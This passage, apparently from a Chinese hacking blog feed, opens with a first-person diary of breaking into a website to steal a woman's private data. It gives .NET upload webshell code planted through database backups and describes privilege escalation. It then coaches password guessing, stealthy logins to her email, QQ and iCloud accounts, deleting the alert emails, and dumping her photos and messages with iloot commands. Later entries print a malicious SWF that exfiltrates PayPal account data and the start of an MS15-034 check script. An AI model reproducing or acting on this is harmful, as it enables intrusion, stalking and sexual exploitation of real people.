通过分析得知主站程序为xxx，其中3个二级域名都指向主站，一开始被这几个站迷惑了以为就是一个站，事实上也是一个站，不同的是，不同二级域名对网站目录的访问权限不一样，有的二级域名可以访问到一些文件，有些却不能访问。通过对比分析找到xxx.xxx.xxx访问主站权限最大，web程序为已知程序，搜索相关漏洞（ps:wooyun主站你懂的，还有一个技巧不知道大家发现没有，有时候非通用漏洞中会出现0day，可能漏洞提交者没有发现这个程序是什么程序，黑盒测试出了漏洞，然后提交了wooyun。其实这个程序是一个通用程序并且黑盒测试出的漏洞竟然是0day。不要不相信，尼玛我就遇到了，就是此例子，是一个.net程序）。&nbsp; &nbsp; 最后通过注入获得了女神数据，但是尼玛搞站不拿到服务器我不爽啊！这种战略资源被入库怎么对的起党和人民，继续，得知数据库为sqlserver 2008 dbo权限：&nbsp; &nbsp; 思路1：找后台，尼玛没找到，被权限掉了（注入出密码加密方式你懂的 .net的自写函数，需自己找到key破解，当时sb的下载源码反编译dll写出解密程序，最后没找到后台，事实告诉我们一定要先找后台，手工注入出一堆数据 还解密了，最后没后台，此时心情千万只草泥马胸中奔腾）&nbsp; &nbsp; 思路2：数据库直接写shell（通过报错得到路径），此时不要看我就一句话“数据库写shell”，其实有一句话这么说的，“纸上得来终觉浅，绝知此事要躬行”&nbsp; &nbsp; 此时是.net程序，差异备份导shell有两种方法：数据库差异 和 日志差异，导入的一句话脚本一般可以有3种asp、vb语法.net、c#语法.net，一般成功率高、出错小的是asp一句话，但此处不支持asp，在.net一句话中：1. &lt;span class=&quot;pln&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;com&quot;&gt;#版本：&lt;/span&gt;2. &lt;span class=&quot;pun&quot;&gt;&amp;lt;%&lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Count&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;){&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;SaveAs&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;MapPath&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;f&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]));}%&amp;gt;&lt;/span&gt;3. &lt;span class=&quot;typ&quot;&gt;Vb&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;版本：&lt;/span&gt;4. &lt;span class=&quot;pun&quot;&gt;&amp;lt;%&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;If&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Count&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;lt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Then&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;SaveAs&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;MapPath&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;f&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)))%&amp;gt;&lt;/span&gt;5. &lt;span class=&quot;pun&quot;&gt;这两个可用，其他都是坑（这不是菜刀可连接一句话，只是一个文件上传小马）&lt;/span&gt;6. &lt;span class=&quot;pun&quot;&gt;客户端：&lt;/span&gt;7. &lt;span class=&quot;pun&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;form action&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;...&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; method&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;post&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; enctype&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;multipart/form-data&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;gt;&lt;/span&gt;8. &lt;span class=&quot;pun&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;input name&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;0&#39;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; type&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;file&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; value&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;gt;&lt;/span&gt;9. &lt;span class=&quot;pun&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;input type&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;submit&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; value&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;提交&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;gt;&lt;/span&gt;10. &lt;span class=&quot;pun&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;gt;&lt;/span&gt;此时坑还没有结束，关于getshell一定要搞清楚权限，渗透就是一个权限提升过程，搞清楚自身所处的权限以及自身权限和其他权限的高低等级相互作用关系。现在我们所处的是数据库的权限我们备份成功了一个小马，然后我们利用小马拉大马，当我们转到小马身上的时候权限已经转变了，我们现在权限变成了web脚本权限，坑来了 web脚本权限在很多目录不可写，此时寻找可写目录，一般程序都会有自己的上传目录缓存目录等等可写目录，坑必然是不会结束的，这可写目录如果管理来个脚本不能解析不就GG了。最后又只能回到我们的数据库权限去备份，尝试各种cmd小马或菜刀小马，多次备份上取（如果日 了狗了有一次成功了呢？差异本分会包含很多杂乱数据影响代码执行，所以差异备份还得有点运气）。我运气没那么差，找到缓存目录上传菜刀小马，自此成功。&nbsp;上webshell后东翻翻西找找sa密码到手，xp_cmdshell system权限。（ps:现在你如果没有什么溢出0day或者正好遇到爆溢出刚不久，你想本地溢出提权很难，大部分数据库提权比较靠谱，还有可能提不了权，直接http sock5进内网），看官一定在说内网内网，我说没有内网你信么？（内网对我的作用不大，内网是到它的主公司去了，这个网站只是它主公司旗下的一项业务而已）。&nbsp; &nbsp; 现在我已经收集到很多数据了，qq号、手机号、常用邮箱、常用密码、真实生日、身份证、真实姓名、工作、常住地等等基本信息（ps:这些嫩模网上能够很容易百度的信息 基本都是假信息，什么生日 姓名都是假的，还是要身份证来的真实）&nbsp; &nbsp; 对于搞站还是那句话，“纸上得来终觉浅，绝知此事要躬行”，现在很多文章都只是介绍什么什么方法，但到了使用的时候，你绝壁发现不是那么回事，各种坑需要填，这就要靠基本功和经验了。0x03 密码组合以及登录尝试&nbsp; &nbsp; 得到了这么多东西，感觉中 各种裸露照正在向我招手。&nbsp; &nbsp; 1.密码组合，一般人设置密码有一个特点，“组合密码”，他会组合他熟知的信息，如一个叫王小东生于1991年5月6日的人，他密码设置为wangxiaodong19910506或wxd19910506，再比如一个人他的所有密码都有一个相同的头部angelin，比如他在90sec注册账号他密码就是angelin90sec，在baidu注册账号就是angelinbaidu，相关东西可以看下https://github.com/Tycx2ry/ButcherKnife/blob/master/%E6%80%9D%E8%B7%AF.md这篇文章。&nbsp; &nbsp; &nbsp;2.与业务相结合的密码组合，比如icloud需要密码的格式是有大小写字幕数字且超过8位，所以登录前查清楚相关应用密码策略&nbsp; &nbsp; &nbsp;3.登录尝试：&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; a.邮箱尝试，一般现在登录都会记录登录地点，所以我们收集信息的常住地有了作用，找个他常住地的vpn或者肉鸡，登录邮箱然后翻阅邮件，技巧1:使用邮箱内置搜索，如：搜索关键字 密码、用户、身份证等。技巧2：查看目标未查看过邮件，查看完一定再标记为未读邮件（以前傻乎乎的不知道这个功能，还不敢看未读邮件）。技巧3：留意注册邮件，邮件有某某网站注册确认信息，表示此邮箱为注册邮箱，必然是我们下个登录尝试目标。&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; b.qq登录尝试，常用地vpn和肉鸡不多说，一定不要傻乎乎的去直接的登录qq，被发现率90%，最好在夜深人静的时候用qq的其他业务的登录，什么邮箱啊，云盘啊&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; c.云盘登录尝试，你懂的美女自拍太多需要存储太多照片，云盘是很多的选择，如：icloud（使用率最高，嫩模还有不用iphone的么）、qq微云（还存qq离线文件）、百度云盘（还存短信）、360云盘。在云盘尝试中百度最坑，第一次登陆他要验证（手机和邮箱验证），一般我就飞一般的速度邮箱验证（如果验证邮箱是qq邮箱请谨慎，微信有提示，其他邮箱一定要检测是否设置短信提示），建议月黑风高好作案。&nbsp; &nbsp; 5.利用邮箱和云盘中信息各大电商网站（密码对与不对80%你可以尝试出正确密码，20%只有密码找回，请别登录淘宝，作死率最高），电商网站中什么蘑菇街之类的女性购物网站最是给力，其中有一项功能是让用户输入身体各种尺寸，你懂的。0x04 手机尝试&nbsp; &nbsp; 什么地方私密信息最多，当然是手机，而作为手机中的战斗机iphone，这是重点中的重点，iphone中的重点是icloud。&nbsp; &nbsp; 如果你像我刚开始傻乎乎就去登录icloud，你绝对会是个悲剧，自从icloud被曝了艳照以后，尼玛只要你登录一次 就会有一封邮件，等一次有一封，刚开始我用icloud的windows工具登录了，web等了，用硬件设备去登录了，然后你懂的分分钟被发现，如果是qq邮箱发现率可高达99.9%。&nbsp; &nbsp; 1.apple id密码尝试，大小写字幕数字且超过8位（一般修改它常用密码首个字母或者单词为大写，成功率50%（尝试过20个以上美女得出结论））&nbsp; &nbsp; 2.尝试登录web icloud，时间绝笔要是月黑风高，然后快速删除邮件。web icloud上你懂的自拍通讯录 必须有（事实上也有很多没有同步）&nbsp; &nbsp; 3.同步云备份，这上边就有很多东西了,同步云备份需要工具，尝试了很多（尼玛全部都是收费的，说是免费，一道关键东西就来请下载专业版，还特贵几百刀），最后iloot工具基本是唯一选择。&nbsp; &nbsp; 4.iloot的使用：&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; 全部拖：iloot.py appleid password&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; 只拖相关数据：iloot.py appleid password&nbsp;–item-types photos,movies,sms,call_histery (图片只拖.jpg 视频只拖.mov,可自行修改源码换其他后缀)&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; 拖指定域：iloot.py appleid password –domain com.tencent.xin 只拖微信域&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; 你以为这样就能成功了，告诉你，你实际尝试的时候各种坑等着，1.安装的时候按照它说的方法，你绝壁不能成功，有些库需要自己到googlecoode手动下载安装，2.此工具没有断点续传，你一来就拖全部，只能告诉你天真，多次使用，得出结论，必然断，然后再重来，然后又断，所以你最好指定域指定域中相关数据，慢慢来。&nbsp; &nbsp; 5.拖回来数据处理，短信记录必然有，sqlsite的，通话记录有，拖微信域，在他目录下qrcode目录中可以找到二维码，可以加女神微信，什么美图相机应用（尼玛使用率真高），关于微信聊天和qq聊天记录的解密还没有找到方法？我想应该是有办法的，因为我已经知道了qq账户和密码，还得继续研究（不过用微信传视频是可以拖出来看），有没有可能拖出cookie，欺骗登录？（书到用时方恨少，不会ios开发）&nbsp; &nbsp; 自此我们掌握了女神的邮件、短信、通话记录、自拍照、自拍小视频，购物记录（ps:冒充送快递）0x05 未能做到的尝试和总结&nbsp; &nbsp; 手机种马，电脑种马，小明能力有限还在学习，我还是个孩子。&nbsp; &nbsp; 本文很多都是经验之谈，可能有些理解错误，请看官指导，有更好的方法请指教&nbsp; &nbsp; 请期待下一篇：【小明渗透日记】小明要租房&nbsp; &nbsp;&nbsp; 来自为知笔记(Wiz)]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[读《crossdomain.xml : Beware of Wildcards》]]></title>
    <url>%2F2015%2F04%2F16%2F30d75fc1c7cf126c4abc187d734caf8b%2F</url>
    <content type="text"><![CDATA[原文：http://blog.h3xstream.com/2015/04/crossdomainxml-beware-of-wildcards.html攻击流程：1.查看目标站点：crossdomain.xml2.在信任域下找能够文件上传的地方（任何格式）3.然后构造恶意页面4.想办法让受害者访问恶意页面（在登录目标站的情况下）5.获取到用户在目标站的信息恶意swf： &lt;span class=&quot;kwd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; getAccountBalanceHttpReq&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; urlLoader &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;URLLoader&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; urlLoader&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Event&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;COMPLETE&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; onComplete&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; urlLoader&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;URLRequest&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;encodeURI&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;https://www.paypal.com/ca/cgi-bin/webscr?cmd=_account&amp;amp;nav=0.0&quot;&quot;)));&lt;/span&gt; &lt;span class=&quot;pun&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt; &lt;span class=&quot;kwd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; onComplete&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Event&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;//Extract balance from the page..&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; balanceRegExp&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;RegExp&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;/\$.&amp;#42USD/&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; amountFound&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; urlLoader&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;match&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;balanceRegExp&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;//Display amount extracted&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;txtCurrentBalance&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;text &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; amountFound&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;//More exfiltration&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;//...etc&lt;/span&gt; &lt;span class=&quot;pun&quot;&gt;}&lt;/span&gt;恶意flash模板：https://github.com/borisreitman/CrossXHR恶意页面： &lt;span class=&quot;pun&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;script src&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;swfobject.js&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;pun&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;var url &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;https://community.ebay.com/ebay01/attachments/ebay01/Communitygroupsandbox/1/12/hello14.jpg&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;swfobject&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;embedSWF&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;evilSwf&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;700&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;400&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;10.0.0&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;expressInstall.swf&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{},&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{},&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{});&lt;/span&gt; &lt;span class=&quot;pun&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;pun&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;div id&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;evilSwf&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;gt;&lt;/span&gt; 来自为知笔记(Wiz)]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[读《MS15-034/CVE-2015-1635 HTTP远程代码执行漏洞分析》]]></title>
    <url>%2F2015%2F04%2F16%2F073c63c1aa3430f492d13288b7bbbc0d%2F</url>
    <content type="text"><![CDATA[原文：http://drops.wooyun.org/papers/5669 修改的测试脚本： &lt;span class=&quot;com&quot;&gt;# -&amp;#42- coding: utf-8 -&amp;#42-&lt;/span&gt;2.3.4. &lt;span class=&quot;str&quot;&gt;&#39;&#39;&#39;&lt;/span&gt; &lt;span class=&quot;str&quot;&gt;___. .___ __ __&lt;/span&gt; &lt;span class=&quot;str&quot;&gt;\_ |__ ____ ___.__. ____ ____ __| _// |________ __ __ _______/ |_&lt;/span&gt; &lt;span class=&quot;str&quot;&gt; | __ \_/ __ &amp;lt; | |/ _ \ / \ / __ |\ __\_ __ \ | \/ ___/\ __\&lt;/span&gt; &lt;span class=&quot;str&quot;&gt; | \_\ \ ___/\___ ( &amp;lt;_&amp;gt; ) | \/ /_/ | | | | | \/ | /\___ \ | |&lt;/span&gt; &lt;span class=&quot;str&quot;&gt; |___ /\___ &amp;gt; ____|\____/|___| /\____ | |__| |__| |____//____ &amp;gt; |__|&lt;/span&gt; &lt;span class=&quot;str&quot;&gt; \/ \/\/ \/ \/ \/&lt;/span&gt; &lt;span class=&quot;str&quot;&gt; MS15-034 Checker&lt;/span&gt;12.13. &lt;span class=&quot;str&quot;&gt;Danger! This script has not been properly qa&#39;d and will probably fail in terrible ways.&lt;/span&gt; &lt;span class=&quot;str&quot;&gt;It is based off a change in HTTP!UlpParseRange in which an error code is returned as a&lt;/span&gt; &lt;span class=&quot;str&quot;&gt;result of a call to HTTP!RtlULongLongAdd when evaluating the upper and lower range of&lt;/span&gt; &lt;span class=&quot;str&quot;&gt;an HTTP range request.&lt;/span&gt; &lt;span class=&quot;str&quot;&gt;-BF&lt;/span&gt;18.19.20. &lt;span class=&quot;str&quot;&gt;8a8b2112 56 push esi&lt;/span&gt; &lt;span class=&quot;str&quot;&gt;8a8b2113 6a00 push 0&lt;/span&gt; &lt;span class=&quot;str&quot;&gt;8a8b2115 2bc7 sub eax,edi&lt;/span&gt; &lt;span class=&quot;str&quot;&gt;8a8b2117 6a01 push 1&lt;/span&gt; &lt;span class=&quot;str&quot;&gt;8a8b2119 1bca sbb ecx,edx&lt;/span&gt; &lt;span class=&quot;str&quot;&gt;8a8b211b 51 push ecx&lt;/span&gt; &lt;span class=&quot;str&quot;&gt;8a8b211c 50 push eax&lt;/span&gt; &lt;span class=&quot;str&quot;&gt;8a8b211d e8bf69fbff call HTTP!RtlULongLongAdd (8a868ae1) ; here&lt;/span&gt;28.29. &lt;span class=&quot;str&quot;&gt;&#39;&#39;&#39;&lt;/span&gt; &lt;span class=&quot;kwd&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; socket&lt;/span&gt; &lt;span class=&quot;kwd&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; random&lt;/span&gt; &lt;span class=&quot;kwd&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; sys&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; re&lt;/span&gt;33.34. &lt;span class=&quot;pln&quot;&gt;hexAllFfff &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;18446744073709551615&quot;&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;lower &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;0&quot;&lt;/span&gt;36.37. &lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; len&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;!=&lt;/span&gt;&lt;span 